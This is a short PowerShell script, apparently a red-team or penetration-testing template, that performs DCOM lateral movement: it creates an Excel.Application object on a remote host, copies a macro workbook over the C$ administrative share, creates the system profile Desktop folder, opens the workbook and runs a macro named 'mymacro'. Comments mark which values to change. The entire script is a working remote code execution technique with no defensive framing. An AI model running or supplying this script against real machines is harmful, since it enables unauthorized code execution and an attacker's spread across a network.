$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110")) # CHANGE: 192.168.1.110 is the IP of the machine we're trying to run the macro on

$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls" # CHANGE: Path of excel document ony local server (where we're running this script)

$RemotePath = "\\192.168.1.110\c$\myexcel.xls" # CHANGE: Destination of where we want to transfer the file to on remote

[System.IO.File]::Copy($LocalPath, $RemotePath, $True) #Copies the document

$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop" #CHANGE: Creates profile for system account. Most likely just need to change the IP

$temp = [system.io.directory]::createDirectory($Path)

$Workbook = $com.Workbooks.Open("C:\myexcel.xls") #CHANGE: has to be where we decided RemotePath was going to send it

$com.Run("mymacro") #CHANGE: Rename to my macro name